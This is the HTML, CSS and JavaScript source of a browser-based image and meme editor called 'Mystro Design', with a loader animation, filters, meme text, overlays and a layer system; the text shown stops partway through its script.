<!DOCTYPE html>
<html>
<head>
<style>
*{
  margin:0;
  padding:0;
  box-sizing:border-box;
}

body{
  background:#111;
  height:100vh;
}

.loader{
  position:fixed;
  inset:0;
  background:#111;

  display:flex;
  justify-content:center;
  align-items:center;

  z-index:9999;

  animation:
    moveLoader .45s ease-in-out 1.2s forwards;
}

.logo{
  width:280px;
}

#mask-rect{
  animation:slideMask 1s ease forwards;
}

@keyframes slideMask{
  from{
    transform:translateY(100%);
  }
  to{
    transform:translateY(0%);
  }
}

@keyframes moveLoader{
  to{
    transform:translateY(-100%);
  }
}
</style>
</head>
<body>
<div class="loader">
<svg class="logo" viewBox="0 0 500 150">
  <image
    href="../Mystro-Editor/Local/logo-gray.svg"
    width="500"
    height="150"
  />

  <mask id="fillMask">
    <rect
      id="mask-rect"
      width="500"
      height="150"
      fill="white"
      transform="translate(0 150)"
    />
  </mask>
  <image
    href="../Mystro-Editor/Local/logo-white.svg"
    width="500"
    height="150"
    mask="url(#fillMask)"
  />

</svg>
</div>
<div>
	<!DOCTYPE html>
	<html lang="en">
	<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<title>Mystro Design 🤑®</title>
	<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
	<style>
	:root {
	  --glass:       rgba(9, 15, 32, 0.75);
	  --glass-2:     rgba(15, 24, 48, 0.65);
	  --glass-3:     rgba(20, 32, 58, 0.55);
	  --border:      rgba(255,255,255,0.09);
	  --border-2:    rgba(255,255,255,0.15);
	  --accent:      #3b82f6;
	  --accent-h:    #60a5fa;
	  --accent-dim:  rgba(59,130,246,0.14);
	  --text:        #dde4ef;
	  --text-dim:    #7c90a8;
	  --text-faint:  #334455;
	  --danger:      #ef4444;
	  --danger-dim:  rgba(239,68,68,0.14);
	  --success:     #22c55e;
	  --panel-l:     260px;
	  --panel-r:     238px;
	  --header-h:    58px;
	  --r:           8px;
	  --r-lg:        12px;
	  --t:           0.16s ease;
	}
	*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
	html, body { height: 100%; }
	body {
	  font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
	  font-size: 13px;
	  color: var(--text);
	  min-height: 100vh;
	  overflow: hidden;
	  background-color: #080c18;
	  background-image:
		radial-gradient(ellipse at 18% 55%, rgba(139,92,246,0.22) 0%, transparent 52%),
		radial-gradient(ellipse at 82% 45%, rgba(219,39,119,0.18) 0%, transparent 52%),
		radial-gradient(ellipse at 50% 95%, rgba(59,130,246,0.18) 0%, transparent 48%),
		url('../Mystro-Editor/Local/Background.webp');
	  background-size: cover;
	  background-position: center;
	  background-attachment: fixed;
	}
	::-webkit-scrollbar { width: 5px; height: 5px; }
	::-webkit-scrollbar-track { background: transparent; }
	::-webkit-scrollbar-thumb { background: rgba(255,255,255,0.13); border-radius: 3px; }
	::-webkit-scrollbar-thumb:hover { background: rgba(255,255,255,0.23); }

	.app-header {
	  position: fixed;
	  top: 0; left: 0; right: 0;
	  height: var(--header-h);
	  background: rgba(6, 10, 22, 0.82);
	  backdrop-filter: blur(20px);
	  -webkit-backdrop-filter: blur(20px);
	  border-bottom: 1px solid var(--border);
	  display: flex;
	  align-items: center;
	  justify-content: space-between;
	  padding: 0 14px;
	  z-index: 200;
	  box-shadow: 0 1px 24px rgba(0,0,0,0.4);
	}
	.header-logo { display: flex; align-items: center; gap: 10px; }
	.header-logo img { height: 36px; object-fit: contain; }
	.header-actions { display: flex; align-items: center; gap: 5px; }

	.app-layout {
	  display: flex;
	  height: calc(100vh - var(--header-h));
	  margin-top: var(--header-h);
	  overflow: hidden;
	}

	.panel {
	  background: var(--glass);
	  backdrop-filter: blur(22px);
	  -webkit-backdrop-filter: blur(22px);
	  overflow-y: auto;
	  overflow-x: hidden;
	  flex-shrink: 0;
	}
	.panel-left  { width: var(--panel-l); border-right: 1px solid var(--border); box-shadow: 2px 0 20px rgba(0,0,0,0.25); }
	.panel-right { width: var(--panel-r); border-left:  1px solid var(--border); box-shadow: -2px 0 20px rgba(0,0,0,0.25); }

	.panel-header {
	  position: sticky; top: 0; z-index: 10;
	  background: rgba(9,15,32,0.9);
	  backdrop-filter: blur(12px);
	  display: flex; align-items: center; justify-content: space-between;
	  padding: 10px 13px;
	  border-bottom: 1px solid var(--border);
	}
	.panel-header h3 {
	  font-size: 11.5px; font-weight: 700;
	  display: flex; align-items: center; gap: 6px; color: var(--text);
	}

	.panel-section { padding: 12px 13px; border-bottom: 1px solid var(--border); }
	.panel-section:last-child { border-bottom: none; }

	.section-title {
	  font-size: 10px; font-weight: 800; text-transform: uppercase;
	  letter-spacing: 0.1em; color: var(--text-dim);
	  margin-bottom: 10px; display: flex; align-items: center; gap: 6px;
	}
	.section-title i { color: var(--accent); font-size: 9px; }

	.ctrl-row { margin-bottom: 9px; }
	.ctrl-row:last-of-type { margin-bottom: 0; }
	.ctrl-row label {
	  display: flex; align-items: center;
	  font-size: 11.5px; color: var(--text-dim); margin-bottom: 4px;
	}
	.vd { margin-left: auto; margin-right: 2px; color: var(--accent-h); font-weight: 700; font-variant-numeric: tabular-nums; min-width: 26px; text-align: right; font-size: 11px; }

	input[type="range"] {
	  -webkit-appearance: none; appearance: none;
	  width: 100%; height: 4px;
	  background: rgba(255,255,255,0.1);
	  border-radius: 2px; outline: none; cursor: pointer;
	}
	input[type="range"]::-webkit-slider-thumb {
	  -webkit-appearance: none;
	  width: 14px; height: 14px;
	  background: var(--accent); border-radius: 50%;
	  border: 2px solid rgba(255,255,255,0.88); cursor: pointer;
	  transition: transform var(--t), box-shadow var(--t);
	}
	input[type="range"]::-webkit-slider-thumb:hover {
	  transform: scale(1.22);
	  box-shadow: 0 0 0 4px rgba(59,130,246,0.28);
	}

	input[type="text"], .text-in {
	  width: 100%;
	  background: rgba(255,255,255,0.06);
	  border: 1px solid var(--border-2);
	  border-radius: var(--r);
	  padding: 7px 9px; color: var(--text); font-size: 12px;
	  margin-bottom: 7px; outline: none; font-family: inherit;
	  transition: border-color var(--t), background var(--t);
	}
	input[type="text"]:focus, .text-in:focus { border-color: var(--accent); background: rgba(59,130,246,0.08); }
	input[type="text"]::placeholder, .text-in::placeholder { color: var(--text-faint); }

	button { cursor: pointer; border: none; background: none; font-family: inherit; }

	.btn-primary {
	  display: flex; align-items: center; gap: 6px;
	  padding: 7px 15px;
	  background: var(--accent); color: #fff;
	  border-radius: var(--r); font-size: 12.5px; font-weight: 700;
	  transition: background var(--t), transform var(--t), box-shadow var(--t);
	  box-shadow: 0 2px 12px rgba(59,130,246,0.35);
	}
	.btn-primary:hover { background: var(--accent-h); box-shadow: 0 4px 20px rgba(59,130,246,0.5); }
	.btn-primary:active { transform: scale(0.96); }

	.btn-sec {
	  display: flex; align-items: center; justify-content: center; gap: 5px;
	  padding: 7px 9px;
	  background: rgba(255,255,255,0.06);
	  border: 1px solid var(--border-2);
	  border-radius: var(--r); color: var(--text); font-size: 11.5px;
	  transition: background var(--t), border-color var(--t);
	}
	.btn-sec:hover { background: rgba(255,255,255,0.11); border-color: rgba(255,255,255,0.22); }
	.btn-sm { padding: 5px 8px; font-size: 11px; }
	.btn-w { width: 100%; }

	.btn-danger {
	  display: flex; align-items: center; justify-content: center; gap: 5px;
	  padding: 6px 9px;
	  background: var(--danger-dim);
	  border: 1px solid rgba(239,68,68,0.26);
	  border-radius: var(--r); color: var(--danger); font-size: 11px;
	  transition: background var(--t);
	}
	.btn-danger:hover { background: rgba(239,68,68,0.24); }

	.icon-btn {
	  width: 30px; height: 30px;
	  display: flex; align-items: center; justify-content: center;
	  border-radius: 6px; color: var(--text-dim); font-size: 13px;
	  transition: background var(--t), color var(--t);
	}
	.icon-btn:hover { background: rgba(255,255,255,0.09); color: var(--text); }
	.icon-btn:disabled { opacity: 0.25; cursor: not-allowed; pointer-events: none; }
	.danger-btn:hover { color: var(--danger) !important; }

	.grid2 { display: grid; grid-template-columns: 1fr 1fr; gap: 5px; margin-top: 3px; }

	.upload-zone {
	  display: flex; flex-direction: column; align-items: center; justify-content: center;
	  gap: 5px; padding: 15px 10px;
	  border: 1.5px dashed var(--border-2);
	  border-radius: var(--r-lg); cursor: pointer;
	  color: var(--text-dim);
	  background: rgba(255,255,255,0.03);
	  text-align: center;
	  transition: all var(--t);
	}
	.upload-zone:hover { border-color: var(--accent); color: var(--accent-h); background: var(--accent-dim); }
	.upload-zone i { font-size: 18px; }
	.upload-zone span { font-size: 12px; }
	.upload-zone small { font-size: 10px; opacity: 0.5; }
	.upload-sm { padding: 9px 10px; }
	.upload-sm i { font-size: 13px; }

	.filter-grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 4px; }
	.filter-btn {
	  padding: 6px 2px; border-radius: 6px; font-size: 10px; font-weight: 700;
	  background: rgba(255,255,255,0.05);
	  border: 1px solid var(--border); color: var(--text-dim);
	  transition: all var(--t); text-align: center;
	}
	.filter-btn:hover { background: rgba(255,255,255,0.09); color: var(--text); }
	.filter-btn.on { background: var(--accent-dim); border-color: var(--accent); color: var(--accent-h); }

	.canvas-area {
	  flex: 1; display: flex; flex-direction: column; overflow: hidden; position: relative;
	  background: rgba(0,0,0,0.28);
	}
	.canvas-toolbar {
	  height: 38px; display: flex; align-items: center; padding: 0 10px; gap: 3px;
	  background: rgba(6,10,22,0.7);
	  backdrop-filter: blur(12px);
	  border-bottom: 1px solid var(--border);
	  flex-shrink: 0;
	}
	.zoom-lbl { font-size: 11.5px; color: var(--text-dim); font-variant-numeric: tabular-nums; min-width: 40px; text-align: center; }
	.canvas-info { margin-left: auto; font-size: 11px; color: var(--text-faint); font-variant-numeric: tabular-nums; }
	.vdivider { width: 1px; height: 18px; background: var(--border-2); margin: 0 4px; flex-shrink: 0; }

	.canvas-wrapper {
	  flex: 1; overflow: auto; display: flex;
	  align-items: center; justify-content: center; padding: 28px;
	}
	.canvas-inner { position: relative; flex-shrink: 0; line-height: 0; }
	#mainCanvas {
	  display: block; border-radius: 4px;
	  box-shadow: 0 0 0 1px rgba(255,255,255,0.1), 0 24px 64px rgba(0,0,0,0.7), 0 4px 16px rgba(0,0,0,0.5);
	}
	#previewCanvas { position: absolute; top: 0; left: 0; pointer-events: none; z-index: 2; }

	.drop-overlay {
	  position: absolute; inset: 0;
	  display: flex; flex-direction: column; align-items: center; justify-content: center; gap: 12px;
	  background: rgba(4,8,20,0.88); border: 2px dashed var(--accent);
	  color: var(--accent-h); font-size: 16px; font-weight: 700;
	  opacity: 0; pointer-events: none; transition: opacity 0.18s; z-index: 100; border-radius: 4px;
	}
	.drop-overlay.on { opacity: 1; }
	.drop-overlay i { font-size: 40px; opacity: 0.75; }

	.layer-list { padding: 7px; }
	.empty-hint { text-align: center; color: var(--text-faint); font-size: 11.5px; padding: 26px 10px; line-height: 1.8; }

	.layer-item {
	  background: rgba(255,255,255,0.04);
	  border: 1px solid var(--border);
	  border-radius: var(--r); margin-bottom: 5px; overflow: hidden;
	  transition: border-color var(--t);
	}
	.layer-item:hover { border-color: var(--border-2); }
	.layer-item.open  { border-color: var(--accent); }

	.layer-hdr {
	  display: flex; align-items: center; padding: 7px 8px; gap: 7px;
	  cursor: pointer; user-select: none;
	}
	.layer-ico {
	  width: 22px; height: 22px; flex-shrink: 0;
	  display: flex; align-items: center; justify-content: center;
	  border-radius: 5px; font-size: 10px;
	}
	.ico-img   { background: rgba(59,130,246,0.2);  color: #60a5fa; }
	.ico-text  { background: rgba(34,197,94,0.2);   color: #4ade80; }
	.ico-shape { background: rgba(168,85,247,0.2);  color: #c084fc; }

	.layer-name {
	  flex: 1; font-size: 11.5px; font-weight: 500;
	  white-space: nowrap; overflow: hidden; text-overflow: ellipsis; color: var(--text);
	}
	.layer-acts { display: flex; gap: 2px; flex-shrink: 0; }
	.layer-acts button {
	  width: 20px; height: 20px;
	  display: flex; align-items: center; justify-content: center;
	  border-radius: 4px; font-size: 9px; color: var(--text-dim);
	  transition: all var(--t);
	}
	.layer-acts button:hover     { background: rgba(255,255,255,0.1); color: var(--text); }
	.layer-acts button.rm:hover  { background: var(--danger-dim); color: var(--danger); }
	.layer-acts button.dup:hover { background: var(--accent-dim); color: var(--accent-h); }

	.layer-ctrls {
	  display: none; flex-direction: column; gap: 7px;
	  padding: 8px 9px 10px;
	  border-top: 1px solid var(--border);
	  background: rgba(0,0,0,0.2);
	}
	.layer-item.open .layer-ctrls { display: flex; }
	.lc-row { display: flex; align-items: center; gap: 7px; }
	.lc-lbl { font-size: 10.5px; color: var(--text-dim); width: 48px; flex-shrink: 0; }
	.lc-row input[type="range"] { flex: 1; }
	.lc-row input[type="text"]  { flex: 1; margin-bottom: 0; padding: 4px 7px; font-size: 11px; }
	.lc-row input[type="color"] {
	  width: 26px; height: 22px; border-radius: 5px;
	  border: 1px solid var(--border-2); cursor: pointer; background: none; padding: 1px; flex-shrink: 0;
	}
	.lc-row select {
	  flex: 1; background: rgba(255,255,255,0.06); border: 1px solid var(--border-2);
	  border-radius: 6px; color: var(--text); padding: 4px 7px;
	  font-size: 11px; font-family: inherit; outline: none;
	}

	.badge {
	  background: var(--accent-dim); color: var(--accent-h);
	  border-radius: 10px; padding: 1px 6px; font-size: 10px; font-weight: 800;
	}

	.shape-hud {
	  position: fixed; bottom: 22px; left: 50%; transform: translateX(-50%);
	  background: rgba(9,15,32,0.92);
	  backdrop-filter: blur(14px);
	  border: 1px solid var(--accent);
	  border-radius: 20px; padding: 8px 16px;
	  display: flex; align-items: center; gap: 10px;
	  font-size: 12.5px; color: var(--accent-h); z-index: 300;
	  box-shadow: 0 4px 24px rgba(59,130,246,0.3);
	}
	.shape-hud[hidden] { display: none; }
	.shape-hud button {
	  padding: 3px 11px; border-radius: 10px;
	  background: var(--danger-dim); border: 1px solid rgba(239,68,68,0.3);
	  color: var(--danger); font-size: 11px; transition: background var(--t);
	}
	.shape-hud button:hover { background: rgba(239,68,68,0.24); }

	.toast {
	  position: fixed; bottom: 22px; right: 22px;
	  background: rgba(9,15,32,0.94);
	  backdrop-filter: blur(14px);
	  border: 1px solid var(--border-2);
	  color: var(--text); padding: 9px 16px;
	  border-radius: var(--r); font-size: 12.5px; z-index: 400;
	  opacity: 0; pointer-events: none;
	  transform: translateY(6px);
	  transition: opacity 0.22s, transform 0.22s;
	  max-width: 280px; line-height: 1.4;
	}
	.toast.on { opacity: 1; transform: translateY(0); }

	.secret-container {
	  display: none;
	  flex-direction: column;
	  align-items: center;
	  justify-content: center;
	  flex: 1;
	  background: rgba(4,8,20,0.95);
	}
	.secret-container.active {
	  display: flex;
	}
	.btn-boost {
	  padding: 20px 40px;
	  font-size: 24px;
	  font-weight: 900;
	  color: #fff;
	  background: linear-gradient(135deg, #22c55e, #3b82f6);
	  border-radius: var(--r-lg);
	  box-shadow: 0 0 30px rgba(34,197,94,0.4);
	  text-transform: uppercase;
	  letter-spacing: 2px;
	  transition: transform 0.1s, box-shadow var(--t);
	}
	.btn-boost:hover {
	  box-shadow: 0 0 45px rgba(34,197,94,0.6);
	}
	.btn-boost:active {
	  transform: scale(0.95);
	}
	</style>
	</head>
	<body>

	<audio id="themeSong" src="local/song.mp3" loop></audio>

	<header class="app-header">
	  <div class="header-logo">
		<img src="../Mystro-Editor/Local/DownloadComputerGames.png" alt="Mystro Design" onerror="this.style.display='none'">
	  </div>
	  <div class="header-actions">
		<button id="muteBtn" class="icon-btn" title="Toggle Music"><i class="fas fa-volume-up"></i></button>
		<div class="vdivider"></div>
		<button id="undoBtn" class="icon-btn" title="Undo (Ctrl+Z)" disabled><i class="fas fa-undo"></i></button>
		<button id="redoBtn" class="icon-btn" title="Redo (Ctrl+Y)" disabled><i class="fas fa-redo"></i></button>
		<div class="vdivider"></div>
		<button id="exportBtn" class="btn-primary"><i class="fas fa-download"></i> Export</button>
	  </div>
	</header>

	<div class="app-layout">

	  <aside class="panel panel-left">

		<div class="panel-section">
		  <label for="imageInput" class="upload-zone">
			<i class="fas fa-cloud-upload-alt"></i>
			<span>Drop image or click to upload</span>
			<small>Paste (Ctrl+V) also works</small>
		  </label>
		  <input type="file" id="imageInput" accept="image/*" hidden>
		</div>

		<div class="panel-section">
		  <h3 class="section-title"><i class="fas fa-expand-arrows-alt"></i> Canvas Size</h3>
		  <div class="ctrl-row">
			<label>Width <span class="vd" id="widthVal">500</span>px</label>
			<input type="range" id="widthRange" min="100" max="3000" value="500" step="10">
		  </div>
		  <div class="ctrl-row">
			<label>Height <span class="vd" id="heightVal">500</span>px</label>
			<input type="range" id="heightRange" min="100" max="3000" value="500" step="10">
		  </div>
		</div>

		<div class="panel-section">
		  <h3 class="section-title"><i class="fas fa-sliders-h"></i> Adjustments</h3>
		  <div class="ctrl-row">
			<label>Brightness <span class="vd" id="brightnessVal">100</span>%</label>
			<input type="range" id="brightness" min="0" max="300" value="100">
		  </div>
		  <div class="ctrl-row">
			<label>Contrast <span class="vd" id="contrastVal">100</span>%</label>
			<input type="range" id="contrast" min="0" max="300" value="100">
		  </div>
		  <div class="ctrl-row">
			<label>Saturation <span class="vd" id="saturationVal">100</span>%</label>
			<input type="range" id="saturation" min="0" max="300" value="100">
		  </div>
		  <div class="ctrl-row">
			<label>Blur <span class="vd" id="blurVal">0</span>px</label>
			<input type="range" id="blurRange" min="0" max="20" value="0" step="0.5">
		  </div>
		  <div class="ctrl-row">
			<label>Pixelate <span class="vd" id="pixelVal">1</span>x</label>
			<input type="range" id="pixelation" min="1" max="30" value="1">
		  </div>
		  <div class="ctrl-row">
			<label>Rounded <span class="vd" id="radiusVal">0</span>%</label>
			<input type="range" id="borderRadius" min="0" max="50" value="0">
		  </div>
		  <button class="btn-sec btn-sm btn-w" style="margin-top:6px" onclick="resetAdj()">
			<i class="fas fa-undo-alt"></i> Reset all
		  </button>
		</div>

		<div class="panel-section">
		  <h3 class="section-title"><i class="fas fa-magic"></i> Filter</h3>
		  <div class="filter-grid">
			<button class="filter-btn on" data-f="none">None</button>
			<button class="filter-btn" data-f="grayscale">B&amp;W</button>
			<button class="filter-btn" data-f="sepia">Sepia</button>
			<button class="filter-btn" data-f="invert">Invert</button>
			<button class="filter-btn" data-f="hue-rotate">Hue</button>
			<button class="filter-btn" data-f="vivid">Vivid</button>
			<button class="filter-btn" data-f="vintage">Vintage</button>
			<button class="filter-btn" data-f="cool">Cool</button>
		  </div>
		</div>

		<div class="panel-section">
		  <h3 class="section-title"><i class="fas fa-sync-alt"></i> Transform</h3>
		  <div class="grid2">
			<button class="btn-sec btn-sm" onclick="flipH()"><i class="fas fa-arrows-alt-h"></i> Flip H</button>
			<button class="btn-sec btn-sm" onclick="flipV()"><i class="fas fa-arrows-alt-v"></i> Flip V</button>
			<button class="btn-sec btn-sm" onclick="rotateCCW()"><i class="fas fa-undo"></i> –90°</button>
			<button class="btn-sec btn-sm" onclick="rotateCW()"><i class="fas fa-redo"></i> +90°</button>
		  </div>
		</div>

		<div class="panel-section">
		  <h3 class="section-title"><i class="fas fa-font"></i> Meme Text</h3>
		  <input type="text" id="topText" placeholder="Top text…">
		  <input type="text" id="bottomText" placeholder="Bottom text…">
		  <div class="ctrl-row">
			<label>Size <span class="vd" id="textSizeVal">30</span>px</label>
			<input type="range" id="textSize" min="10" max="140" value="30">
		  </div>
		  <div class="grid2">
			<button class="btn-sec btn-sm" onclick="stampArabic()"><i class="fas fa-language"></i> Arabic</button>
			<button class="btn-sec btn-sm" onclick="stampEmojis()"><i class="far fa-smile"></i> Emojis</button>
		  </div>
		</div>

		<div class="panel-section">
		  <h3 class="section-title"><i class="fas fa-clone"></i> Image Overlay</h3>
		  <label for="overlayInput" class="upload-zone upload-sm">
			<i class="fas fa-image"></i><span>Add overlay image</span>
		  </label>
		  <input type="file" id="overlayInput" accept="image/*" hidden>
		  <div id="overlayExtra" hidden style="margin-top:8px;display:flex;flex-direction:column;gap:6px">
			<div class="ctrl-row">
			  <label>Opacity <span class="vd" id="overlayOpVal">100</span>%</label>
			  <input type="range" id="overlayOpacity" min="0" max="100" value="100">
			</div>
			<button class="btn-danger btn-sm btn-w" onclick="removeOverlay()"><i class="fas fa-times"></i> Remove</button>
		  </div>
		</div>

		<div class="panel-section">
		  <h3 class="section-title"><i class="fas fa-plus-circle"></i> Add Layer</h3>
		  <div class="grid2">
			<button class="btn-sec btn-sm" id="addTextBtn"><i class="fas fa-font"></i> Text</button>
			<label for="layerImgInput" class="btn-sec btn-sm" style="cursor:pointer"><i class="fas fa-image"></i> Image</label>
			<button class="btn-sec btn-sm" id="addCircleBtn"><i class="far fa-circle"></i> Circle</button>
			<button class="btn-sec btn-sm" id="addArrowBtn"><i class="fas fa-arrow-right"></i> Arrow</button>
		  </div>
		  <input type="file" id="layerImgInput" accept="image/*" hidden>
		</div>

	  </aside>

	  <main class="canvas-area">
		<div class="canvas-toolbar">
		  <button id="autoZoomBtn" class="icon-btn" title="Toggle Auto Zoom"><i class="fas fa-lock"></i></button>
		  <div class="vdivider"></div>
		  <button class="icon-btn" onclick="zoomOut()" title="Zoom out (-)"><i class="fas fa-search-minus"></i></button>
		  <span class="zoom-lbl" id="zoomLbl">100%</span>
		  <button class="icon-btn" onclick="zoomIn()" title="Zoom in (+)"><i class="fas fa-search-plus"></i></button>
		  <button class="icon-btn" onclick="zoomFit()" title="Fit (0)"><i class="fas fa-compress-arrows-alt"></i></button>
		  <div class="vdivider"></div>
		  <span class="canvas-info" id="sizeInfo">500 × 500</span>
		</div>
		<div class="canvas-wrapper" id="canvasWrapper">
		  <div class="canvas-inner" id="canvasInner">
			<canvas id="mainCanvas" width="500" height="500"></canvas>
			<canvas id="previewCanvas" width="500" height="500"></canvas>
		  </div>
		</div>
		<div id="secretContainer" class="secret-container">
		  <button class="btn-boost" id="boostBtn">Boost FPS</button>
		</div>
		<div class="drop-overlay" id="dropOverlay">
		  <i class="fas fa-cloud-upload-alt"></i><span>Drop to load image</span>
		</div>
	  </main>

	  <aside class="panel panel-right">
		<div class="panel-header">
		  <h3><i class="fas fa-layer-group"></i> Layers <span class="badge" id="layerCount">0</span></h3>
		  <button class="icon-btn danger-btn" onclick="clearLayers()" title="Clear all"><i class="fas fa-trash-alt"></i></button>
		</div>
		<div id="layerList" class="layer-list">
		  <p class="empty-hint">No layers yet.<br>Add text, images or shapes.</p>
		</div>
	  </aside>
	</div>

	<div class="shape-hud" id="shapeHud" hidden>
	  <i class="fas fa-crosshairs"></i>
	  <span id="hudLabel">Click and drag on the canvas</span>
	  <button onclick="cancelShape()">Cancel</button>
	</div>
	<div class="toast" id="toast"></div>

	<script>
	'use strict';

	const canvas   = document.getElementById('mainCanvas');
	const previewC = document.getElementById('previewCanvas');
	const ctx      = canvas.getContext('2d');
	const pCtx     = previewC.getContext('2d');
	const themeSong = document.getElementById('themeSong');
	const muteBtn = document.getElementById('muteBtn');

	let mainImg   = null;
	let overlayImg = null;
	let layers    = [];
	let idCtr     = 0;
	let filter    = 'none';
	let tf        = { sx: 1, sy: 1, rot: 0 };
	let drag      = { layer: null, ox: 0, oy: 0 };
	let shape     = { type: null, drawing: false, x0:0, y0:0, x1:0, y1:0 };
	let hist      = [];
	let hIdx      = -1;
	let zoom      = 1;
	let autoZoom  = true;
	let audioStarted = false;
	let isMuted   = false;
	let fadeInterval;

	themeSong.volume = 0.6;

	const FONTS = ['Impact','Arial Black','Comic Sans MS','Georgia','Verdana','Courier New'];

	const RANGES = {
	  widthRange:'widthVal', heightRange:'heightVal',
	  brightness:'brightnessVal', contrast:'contrastVal', saturation:'saturationVal',
	  blurRange:'blurVal', pixelation:'pixelVal', borderRadius:'radiusVal',
	  textSize:'textSizeVal', overlayOpacity:'overlayOpVal'
	};

	function gv(id){ return document.getElementById(id).value; }
	function gi(id){ return parseInt(gv(id)); }
	function gf(id){ return parseFloat(gv(id)); }

	function adj(){
	  return {
		w: gi('widthRange'), h: gi('heightRange'),
		br: gi('brightness'), ct: gi('contrast'), sa: gi('saturation'),
		bl: gf('blurRange'), px: gi('pixelation'), rr: gi('borderRadius'),
		top: gv('topText'), bot: gv('bottomText'), ts: gi('textSize'),
		ov: gi('overlayOpacity') / 100
	  };
	}

	function render(){
	  if (!mainImg){
		ctx.clearRect(0,0,canvas.width,canvas.height);
		ctx.fillStyle='rgba(0,0,0,0.35)';
		ctx.fillRect(0,0,canvas.width,canvas.height);
		return;
	  }
	  const a = adj();
	  if (canvas.width !== a.w || canvas.height !== a.h){
		canvas.width = previewC.width = a.w;
		canvas.height = previewC.height = a.h;
		document.getElementById('sizeInfo').textContent = `${a.w} × ${a.h}`;
		if(autoZoom) zoomFit();
	  }
	  ctx.clearRect(0,0,canvas.width,canvas.height);

	  let fs = `brightness(${a.br}%) contrast(${a.ct}%) saturate(${a.sa}%)`;
	  if (a.bl > 0) fs += ` blur(${a.bl}px)`;
	  switch(filter){
		case 'grayscale':  fs += ' grayscale(100%)'; break;
		case 'sepia':      fs += ' sepia(100%)'; break;
		case 'invert':     fs += ' invert(100%)'; break;
		case 'hue-rotate': fs += ' hue-rotate(90deg)'; break;
		case 'vivid':      fs += ' saturate(240%) contrast(112%)'; break;
		case 'vintage':    fs += ' sepia(52%) contrast(112%) brightness(90%)'; break;
		case 'cool':       fs += ' hue-rotate(195deg) saturate(125%)'; break;
	  }

	  ctx.save();
	  ctx.filter = fs;
	  ctx.translate(canvas.width/2, canvas.height/2);
	  ctx.rotate(tf.rot * Math.PI/180);
	  ctx.scale(tf.sx, tf.sy);

	  if (a.px > 1){
		const pw = Math.max(1, Math.floor(canvas.width/a.px));
		const ph = Math.max(1, Math.floor(canvas.height/a.px));
		const tmp = Object.assign(document.createElement('canvas'),{width:pw,height:ph});
		tmp.getContext('2d').drawImage(mainImg,0,0,pw,ph);
		ctx.imageSmoothingEnabled = false;
		ctx.drawImage(tmp,-canvas.width/2,-canvas.height/2,canvas.width,canvas.height);
		ctx.imageSmoothingEnabled = true;
	  } else {
		ctx.drawImage(mainImg,-canvas.width/2,-canvas.height/2,canvas.width,canvas.height);
	  }
	  ctx.restore();
	  ctx.filter = 'none';

	  if (a.rr > 0){
		const r = (a.rr/100) * Math.min(canvas.width,canvas.height)/2;
		ctx.globalCompositeOperation = 'destination-in';
		ctx.beginPath();
		ctx.roundRect(0,0,canvas.width,canvas.height,r);
		ctx.fill();
		ctx.globalCompositeOperation = 'source-over';
	  }

	  if (overlayImg){
		ctx.globalAlpha = a.ov;
		ctx.drawImage(overlayImg,0,0,canvas.width,canvas.height);
		ctx.globalAlpha = 1;
	  }

	  const ts = a.ts;
	  ctx.save();
	  ctx.font = `bold ${ts}px Impact,"Arial Black",sans-serif`;
	  ctx.textAlign = 'center';
	  ctx.fillStyle = 'white';
	  ctx.strokeStyle = 'black';
	  ctx.lineWidth = Math.max(2, ts*0.07);
	  ctx.lineJoin = 'round';
	  if (a.top){ ctx.strokeText(a.top,canvas.width/2,ts*1.15); ctx.fillText(a.top,canvas.width/2,ts*1.15); }
	  if (a.bot){ ctx.strokeText(a.bot,canvas.width/2,canvas.height-ts*0.35); ctx.fillText(a.bot,canvas.width/2,canvas.height-ts*0.35); }
	  ctx.restore();

	  layers.forEach(l => drawLayer(ctx,l));
	}

	function drawLayer(c,l){
	  c.save();
	  c.translate(l.x,l.y);
	  c.rotate(l.rot*Math.PI/180);
	  if (l.type==='image'){
		c.globalAlpha = l.opacity??1;
		c.scale(l.scale,l.scale);
		c.drawImage(l.img,-l.img.width/2,-l.img.height/2);
	  } else if (l.type==='text'){
		const fs = l.fontSize??40;
		c.font = `${l.bold?'bold ':''}${fs}px ${l.font??'Impact'},sans-serif`;
		c.textAlign='center'; c.textBaseline='middle';
		if (l.outline!==false){
		  c.strokeStyle=l.outlineColor??'#000'; c.lineWidth=Math.max(1,fs*0.08); c.lineJoin='round';
		  c.strokeText(l.text,0,0);
		}
		c.fillStyle=l.color??'#fff'; c.fillText(l.text,0,0);
	  } else if (l.type==='shape'){
		c.globalAlpha=l.opacity??1;
		c.strokeStyle=l.color??'#f00'; c.fillStyle=l.color??'#f00'; c.lineWidth=l.strokeWidth??3;
		c.scale(l.scale,l.scale);
		if (l.shape==='circle'){ c.beginPath(); c.arc(0,0,50,0,Math.PI*2); c.stroke(); }
		else if (l.shape==='arrow'){ arrow(c,0,0,100,0,l.strokeWidth??3); }
	  }
	  c.restore();
	}

	function arrow(c,x1,y1,x2,y2,w){
	  const hl=Math.max(w*4,12), ang=Math.atan2(y2-y1,x2-x1);
	  const stopX = x2 - (hl * 0.8) * Math.cos(ang);
	  const stopY = y2 - (hl * 0.8) * Math.sin(ang);
	  
	  c.lineCap = 'round';
	  c.beginPath(); 
	  c.moveTo(x1,y1); 
	  c.lineTo(stopX,stopY); 
	  c.stroke();
	  
	  c.beginPath();
	  c.moveTo(x2,y2);
	  c.lineTo(x2-hl*Math.cos(ang-Math.PI/6),y2-hl*Math.sin(ang-Math.PI/6));
	  c.lineTo(x2-hl*Math.cos(ang+Math.PI/6),y2-hl*Math.sin(ang+Math.PI/6));
	  c.closePath(); 
	  c.fill();
	}

	function loadSrc(src,cb){ const i=new Image(); i.onload=()=>cb(i); i.src=src; }
	function readFile(file,cb){ const r=new FileReader(); r.onload=e=>cb(e.target.result); r.readAsDataURL(file); }

	function loadMain(src){
	  loadSrc(src,img=>{
		mainImg=img; tf={sx:1,sy:1,rot:0};
		const w=Math.min(img.naturalWidth,2400), h=Math.min(img.naturalHeight,2400);
		document.getElementById('widthRange').value=w;
		document.getElementById('heightRange').value=h;
		canvas.width=previewC.width=w; canvas.height=previewC.height=h;
		document.getElementById('sizeInfo').textContent=`${w} × ${h}`;
		updDisplays(); 
		if(autoZoom) zoomFit(); else applyZoom();
		render(); saveHist();
	  });
	}

